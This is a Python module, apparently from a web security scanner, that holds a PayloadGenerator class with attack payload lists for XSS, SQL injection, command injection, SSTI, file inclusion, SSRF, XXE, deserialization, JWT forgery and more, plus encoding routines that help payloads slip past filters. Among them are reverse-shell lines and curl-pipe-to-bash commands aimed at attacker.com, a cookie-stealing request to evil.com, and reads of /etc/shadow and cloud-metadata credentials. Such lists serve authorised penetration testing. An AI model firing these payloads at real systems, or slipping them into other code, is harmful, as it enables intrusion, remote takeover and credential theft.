import hashlib
import itertools
import logging
import random
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set
from urllib.parse import quote

logger = logging.getLogger(__name__)


@dataclass
class Payload:
    value: str
    category: str
    vuln_types: List[str] = field(default_factory=list)
    encoding: str = "raw"
    tags: List[str] = field(default_factory=list)


class PayloadGenerator:

    XSS_PAYLOADS = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "javascript:alert(1)",
        "<body onload=alert(1)>",
        "'\"><script>alert(1)</script>",
        "<iframe src=javascript:alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<video><source onerror=\"alert(1)\">",
        "<input onfocus=alert(1) autofocus>",
        "<select onfocus=alert(1) autofocus>",
        "<textarea onfocus=alert(1) autofocus>",
        "<keygen onfocus=alert(1) autofocus>",
        "<object data=javascript:alert(1)>",
        "<embed src=javascript:alert(1)>",
        "<form><button formaction=javascript:alert(1)>X",
        "<math><maction actiontype=statusline xlink:href=javascript:alert(1)>X",
        "<a href=javascript:alert(1)>click",
        "<base href=javascript:alert(1)>//",
        "'-alert(1)-'",
        "\"-alert(1)//",
        "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
        "&#60;script&#62;alert(1)&#60;/script&#62;",
        "%3Cscript%3Ealert(1)%3C/script%3E",
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<script>confirm(1)</script>",
        "<script>prompt(1)</script>",
        "';alert(String.fromCharCode(88,83,83))//",
        "\"><svg/onload=alert(document.domain)>",
        "<img src=x onerror=\"fetch('https://evil.com/'+document.cookie)\">",
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
        "<style>@keyframes x{}</style><foo style=\"animation-name:x\" onanimationstart=\"alert(1)\"></foo>",
        "<div/style=\"width:expression(alert(1))\">",
        "<link rel=import href=\"data:text/html,<script>alert(1)</script>\">",
    ]

    SQLI_PAYLOADS = [
        "' OR '1'='1",
        "' OR 1=1--",
        "\" OR 1=1--",
        "' OR 'x'='x",
        "1' OR '1'='1",
        "1 OR 1=1",
        "' UNION SELECT NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT username,password FROM users--",
        "' UNION SELECT table_name,NULL FROM information_schema.tables--",
        "' UNION ALL SELECT NULL,NULL,NULL--",
        "' OR 1=1 UNION SELECT load_file('/etc/passwd'),2,3--",
        "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' AND SLEEP(5)--",
        "' WAITFOR DELAY '0:0:5'--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))abc)--",
        "' OR IF(1=1,SLEEP(5),0)--",
        "1' AND extractvalue(1,concat(0x7e,(SELECT version())))--",
        "' OR updatexml(1,concat(0x7e,(SELECT version())),1)--",
        "admin'--",
        "admin'/*",
        "1;DROP TABLE users--",
        "1' HAVING 1=1--",
        "' GROUP BY columnname HAVING 1=1--",
        "' ORDER BY 1--",
        "' ORDER BY 10--",
        "1' AND (SELECT 1)=1--",
        "1' AND 1=CAST((SELECT @@version) AS INT)--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--",
        "0' UNION SELECT 1,@@version,3--",
    ]

    COMMAND_INJECTION_PAYLOADS = [
        ";ls -la",
        ";cat /etc/passwd",
        "|ls -la",
        "|cat /etc/passwd",
        "`ls`",
        "`cat /etc/passwd`",
        "$(ls)",
        "$(cat /etc/passwd)",
        ";id",
        "|id",
        ";whoami",
        "|whoami",
        ";uname -a",
        ";cat /etc/shadow",
        "|cat /etc/shadow",
        ";&echo PWNED",
        "|&echo PWNED",
        "||echo PWNED",
        "&&echo PWNED",
        "%0Acat /etc/passwd",
        "%0D%0Acat /etc/passwd",
        "';ls#'",
        "\";ls#",
        "| nc -e /bin/sh attacker.com 4444",
        ";bash -i >& /dev/tcp/attacker.com/4444 0>&1",
        ";python -c 'import os;os.system(\"id\")'",
        ";python3 -c 'import os;os.system(\"id\")'",
        "|curl http://attacker.com/shell.sh|bash",
        ";wget http://attacker.com/shell.sh -O /tmp/s && bash /tmp/s",
        "%7Ccat%20/etc/passwd",
    ]

    SSTI_PAYLOADS = [
        "{{7*7}}",
        "${7*7}",
        "{{config}}",
        "{{self.__dict__}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{request.application.__globals__.__builtins__}}",
        "{{cycler.__init__.__globals__.os}}",
        "${{7*7}}",
        "#{7*7}",
        "<%= 7*7 %>",
        "{{ 7*7 }}",
        "{{''}}",
        "{{config.items()}}",
        "{{get_flashed_messages.__globals__}}",
        "{{url_for.__globals__['os'].popen('id').read()}}",
        "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}",
        "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
        "{{''.__class__.__mro__[2].__subclasses__()[258]('id',shell=True,stdout=-1).communicate()}}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "#{T(java.lang.Runtime).getRuntime().exec('id')}",
        "{{dump(app)}}",
        "{{app.request.server.all|join(',')}}",
        "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}",
    ]

    LFI_PAYLOADS = [
        "../../../../etc/passwd",
        "..%2f..%2f..%2f..%2fetc%2fpasswd",
        "....//....//....//....//etc/passwd",
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/proc/self/environ",
        "/proc/version",
        "/proc/cmdline",
        "/proc/sched_debug",
        "/proc/mounts",
        "/proc/net/arp",
        "/proc/net/tcp",
        "/proc/net/fib_trie",
        "php://filter/read=convert.base64-encode/resource=index.php",
        "php://input",
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
        "expect://id",
        "file:///etc/passwd",
        "file:///proc/self/environ",
        "....//....//....//....//....//etc/passwd",
        "..%252f..%252f..%252f..%252fetc%252fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "/var/log/apache2/access.log",
        "/var/log/nginx/access.log",
        "C:\\Windows\\win.ini",
        "C:\\boot.ini",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "/etc/resolv.conf",
        "/etc/group",
    ]

    SSRF_PAYLOADS = [
        "http://127.0.0.1",
        "http://localhost",
        "http://0.0.0.0",
        "http://[::]",
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://10.0.0.1",
        "http://192.168.1.1",
        "http://172.16.0.1",
        "http://127.0.0.1:6379",
        "http://127.0.0.1:2375",
        "http://127.0.0.1:9200",
        "http://127.0.0.1:27017",
        "http://127.0.0.1:8500/v1/agent/self",
        "gopher://127.0.0.1:6379/_INFO",
        "dict://127.0.0.1:6379/INFO",
        "file:///etc/passwd",
        "http://0x7f000001",
        "http://2130706433",
        "http://localhost:22",
        "http://localhost:3306",
        "http://localhost:5432",
        "http://localhost:8080",
        "http://localhost:443/admin",
        "http://169.254.169.254/latest/meta-data/hostname",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name",
        "http://metadata.oraclecloud.com/latest/meta-data/",
        "http://100.100.100.200/latest/meta-data/",
    ]

    XXE_PAYLOADS = [
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe.dtd">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">%dtd;]><foo>&all;</foo>',
        '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]><root>&xxe;</root>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><root>&xxe;</root>',
        '<!DOCTYPE data SYSTEM "file:///dev/random" []>',
        '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ELEMENT lolz (#PCDATA)><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><lolz>&lol1;</lolz>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "data:text/plain;base64,SGVsbG8=">]><root>&xxe;</root>',
    ]

    OPEN_REDIRECT_PAYLOADS = [
        "//evil.com",
        "//google.com",
        "https://evil.com",
        "http://evil.com",
        "/\\evil.com",
        "%2f%2fevil.com",
        "//evil.com%2f%2egoogle.com",
        "https:evil.com",
        "https:///evil.com",
        "////evil.com",
        "///google.com///",
        "/http://evil.com",
        "?url=https://evil.com",
        "redirect=https://evil.com",
        "next=https://evil.com",
        "return=https://evil.com",
        "goto=https://evil.com",
        "continue=https://evil.com",
        "redir=https://evil.com",
        "returnUrl=https://evil.com",
    ]

    CRLF_PAYLOADS = [
        "%0d%0aSet-Cookie:session=hacked",
        "%0a%0dSet-Cookie:session=hacked",
        "%E5%98%8A%E5%98%8DSet-Cookie:session=hacked",
        "\r\nSet-Cookie: session=hacked",
        "\nSet-Cookie: session=hacked",
        "%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0aContent-Length:19%0d%0a%0d%0a<script>alert(1)</script>",
        "%0d%0aX-XSS-Protection:0",
        "%0d%0aContent-Security-Policy:default-src%20*",
        "Set-Cookie:%20session=hacked",
        "X-Injected:header%0d%0aSet-Cookie:evil=1",
    ]

    FILE_UPLOAD_PAYLOADS = [
        "shell.php",
        "shell.php.jpg",
        "shell.php%00.jpg",
        "shell.pHp",
        "shell.php3",
        "shell.php4",
        "shell.php5",
        "shell.phtml",
        "shell.phar",
        "shell.inc",
        "shell.cgi",
        "shell.jsp",
        "shell.aspx",
        "shell.asp",
        ".htaccess",
        "web.config",
        "shell.php;.jpg",
        "shell.php:;.jpg",
        "\x00shell.php",
        "shell.php\u200b",
    ]

    AUTH_BYPASS_PAYLOADS = [
        "admin'--",
        "admin'/*",
        "' OR '1'='1'/*",
        "admin' UNION SELECT 'admin','password'--",
        "{\"username\":\"admin\",\"password\":{\"$ne\":\"\"}}",
        "admin\"--",
        "') OR ('1'='1",
        "') OR 1=1--",
        "' OR ''='",
        "admin' AND 1=1--",
        "admin\" OR 1=1--",
        "' OR 1=1#",
        "admin' OR 'a'='a",
        "' OR '1'='1'#",
        "admin' HAVING 1=1--",
        "admin' GROUP BY columnname HAVING 1=1--",
        "admin' ORDER BY 1--",
        "' AND SLEEP(5)--",
        "admin' AND 1=CONVERT(int,(SELECT TOP 1 username FROM users))--",
        "admin';WAITFOR DELAY '0:0:5'--",
    ]

    NOSQL_PAYLOADS = [
        '{"$gt": ""}',
        '{"$ne": ""}',
        '{"$gt": "", "$lt": ""}',
        '{"$regex": "^a"}',
        '{"$where": "return true"}',
        '{"$where": "sleep(5000)"}',
        '{"$where": "this.username.match(/admin/)"}',
        'admin[$ne]=',
        'password[$ne]=',
        '{"$in": ["admin", "root"]}',
        '{"username": {"$regex": ".*"}}',
        'username[$regex]=.*',
        '{"$where": "function(){sleep(5000);return true;}" }',
        "1;return this",
        "admin';return this;//",
    ]

    HEADER_INJECTION_PAYLOADS = [
        "X-Forwarded-Host: evil.com",
        "X-Forwarded-For: 127.0.0.1",
        "X-Original-URL: /admin",
        "X-Rewrite-URL: /admin",
        "X-Host: evil.com",
        "X-Forwarded-Proto: https",
        "X-Forwarded-Scheme: https",
        "X-Forwarded-Port: 443",
        "X-Custom-IP-Authorization: 127.0.0.1",
        "True-Client-IP: 127.0.0.1",
        "Forwarded: for=127.0.0.1",
        "X-Real-IP: 127.0.0.1",
    ]

    PROTOTYPE_POLLUTION_PAYLOADS = [
        '{"__proto__":{"isAdmin":true}}',
        '{"constructor":{"prototype":{"isAdmin":true}}}',
        '{"__proto__.isAdmin":true}',
        'data[__proto__][isAdmin]=true',
        'data[constructor][prototype][isAdmin]=true',
        '{"__proto__":{"exec":"id"}}',
        '{"__proto__":{"json spaces":1}}',
        '{"__proto__.polluted":true}',
        'search[__proto__]=true',
        'filter[__proto__][exec]=id',
    ]

    DESERIALIZATION_PAYLOADS = [
        "O:4:\"Test\":1:{s:4:\"data\";s:6:\"PWNED\";}",
        "rO0ABXQABFBXT05FRA==",
        "gASVBwAAAAAAAABdlC4=",
        "!!python/object/apply:os.system ['id']",
        "!!ruby/object:Gem::Installer",
        "com.sun.rowset.JdbcRowSetImpl",
        "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAAEdGVzdHg=",
        "(fp0\nS'os'\np1\n(S'system'\np2\nS'id'\np3\ntp4\nRp5\n.",
    ]

    JWT_PAYLOADS = [
        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.",
        "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJhZG1pbiI6dHJ1ZX0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
        "eyJhbGciOiJIUzM4NCIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.",
        "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Imh0dHBzOi8vZXZpbC5jb20va2V5In0.eyJzdWIiOiJhZG1pbiJ9.",
        "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.",
        "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpc3MiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.",
    ]

    LDAP_PAYLOADS = [
        "*)(&",
        "*)(uid=*))(|(uid=*",
        "admin)(&1=1)",
        "*))%00",
        "*)(cn=*))(|(cn=*",
        "admin*)((|userpassword=*)",
        "user*)(cn=*))(|(cn=*))",
        "admin*)(&(|userpassword=*))",
        ")(cn=*))(|(cn=*",
        "*))%00)(cn=*",
    ]

    PAYLOAD_DB: Dict[str, List[str]] = {}

    def __init__(self):
        self._db: Dict[str, List[Payload]] = {}
        self._build_db()

    def _build_db(self):
        mapping = [
            ("xss", self.XSS_PAYLOADS, ["xss_reflected", "xss_stored", "xss_dom", "blind_xss"]),
            ("sqli", self.SQLI_PAYLOADS, ["sqli_error", "sqli_union", "sqli_blind", "sqli_time"]),
            ("command_injection", self.COMMAND_INJECTION_PAYLOADS, ["command_injection", "rce"]),
            ("ssti", self.SSTI_PAYLOADS, ["ssti", "blind_ssti"]),
            ("lfi", self.LFI_PAYLOADS, ["lfi", "path_traversal", "rfi"]),
            ("ssrf", self.SSRF_PAYLOADS, ["ssrf", "ssrf_cloud", "blind_ssrf"]),
            ("xxe", self.XXE_PAYLOADS, ["xxe", "blind_xxe", "xml_external_entity"]),
            ("open_redirect", self.OPEN_REDIRECT_PAYLOADS, ["open_redirect"]),
            ("crlf", self.CRLF_PAYLOADS, ["crlf_injection", "header_injection"]),
            ("file_upload", self.FILE_UPLOAD_PAYLOADS, ["file_upload"]),
            ("auth_bypass", self.AUTH_BYPASS_PAYLOADS, ["auth_bypass", "broken_authentication"]),
            ("nosql", self.NOSQL_PAYLOADS, ["nosql_injection"]),
            ("header_injection", self.HEADER_INJECTION_PAYLOADS, ["host_header_injection"]),
            ("prototype_pollution", self.PROTOTYPE_POLLUTION_PAYLOADS, ["prototype_pollution"]),
            ("deserialization", self.DESERIALIZATION_PAYLOADS, ["insecure_deserialization"]),
            ("jwt", self.JWT_PAYLOADS, ["jwt_manipulation"]),
            ("ldap", self.LDAP_PAYLOADS, ["ldap_injection", "ldap_injection_advanced"]),
        ]
        for cat, payloads, vuln_types in mapping:
            payload_objects = []
            for val in payloads:
                encoding = "url" if "%" in val else "html" if "&#" in val or "&#x" in val else "raw"
                p = Payload(value=val, category=cat, vuln_types=vuln_types, encoding=encoding)
                payload_objects.append(p)
            self._db[cat] = payload_objects
            for vt in vuln_types:
                self.PAYLOAD_DB[vt] = payloads

    def generate_for_type(self, vuln_type: str, limit: int = 10) -> List[str]:
        payloads = self.PAYLOAD_DB.get(vuln_type, [])
        if not payloads:
            for cat, items in self._db.items():
                for p in items:
                    if vuln_type in p.vuln_types:
                        payloads.append(p.value)
        if not payloads:
            payloads = self._generate_fallback(vuln_type)
        return payloads[:limit]

    def generate_all_for_type(self, vuln_type: str) -> List[str]:
        return self.generate_for_type(vuln_type, limit=999)

    def generate_variants(self, payload: str, vuln_type: str, count: int = 5) -> List[str]:
        variants = [payload]
        encoded = self._url_encode(payload)
        if encoded != payload:
            variants.append(encoded)
        double_encoded = self._url_encode(encoded)
        if double_encoded != payload and double_encoded != encoded:
            variants.append(double_encoded)
        html_encoded = self._html_encode(payload)
        if html_encoded != payload:
            variants.append(html_encoded)
        unicode_encoded = self._unicode_encode(payload)
        if unicode_encoded != payload:
            variants.append(unicode_encoded)
        case_mixed = self._case_mix(payload)
        if case_mixed != payload:
            variants.append(case_mixed)
        if vuln_type.startswith("sqli"):
            comment_variants = self._add_sql_comments(payload)
            variants.extend(comment_variants)
        if vuln_type.startswith("xss"):
            svg_variants = self._svg_variants(payload)
            variants.extend(svg_variants)
        return list(dict.fromkeys(variants))[:count]

    def _generate_fallback(self, vuln_type: str) -> List[str]:
        return [
            f"<script>alert('{vuln_type}')</script>",
            f"' OR 1=1-- {vuln_type}",
            f"../../../../etc/passwd?{vuln_type}=1",
            f"http://127.0.0.1/{vuln_type}",
            f"{{{{{7*7}}}}}",
        ]

    def _url_encode(self, s: str) -> str:
        return quote(s, safe="")

    def _html_encode(self, s: str) -> str:
        table = {"<": "&#60;", ">": "&#62;", "'": "&#39;", '"': "&#34;", "/": "&#47;"}
        for k, v in table.items():
            s = s.replace(k, v)
        return s

    def _unicode_encode(self, s: str) -> str:
        table = {"<": "\\u003c", ">": "\\u003e", "'": "\\u0027", '"': "\\u0022", "/": "\\u002f"}
        for k, v in table.items():
            s = s.replace(k, v)
        return s

    def _case_mix(self, s: str) -> str:
        result = []
        upper = True
        for c in s:
            if c.isalpha():
                result.append(c.upper() if upper else c.lower())
                upper = not upper
            else:
                result.append(c)
        return "".join(result)

    def _add_sql_comments(self, payload: str) -> List[str]:
        import re
        variants = []
        for kw in ["UNION", "SELECT", "OR", "AND", "FROM", "WHERE"]:
            v = re.sub(rf'\b{kw}\b', f'/*!50000{kw}*/', payload, flags=re.IGNORECASE)
            if v != payload:
                variants.append(v)
        return variants

    def _svg_variants(self, payload: str) -> List[str]:
        import re
        variants = []
        match = re.search(r'(?:alert|confirm|prompt)\([^)]*\)', payload)
        if match:
            js = match.group(0)
            variants.append(f'<svg onload="{js}">')
            variants.append(f'<svg><script>{js}</script></svg>')
        return variants

    def get_categories(self) -> List[str]:
        return list(self._db.keys())

    def get_payload_count(self) -> int:
        return sum(len(v) for v in self.PAYLOAD_DB.values())

    def get_stats(self) -> Dict[str, int]:
        return {cat: len(payloads) for cat, payloads in self.PAYLOAD_DB.items()}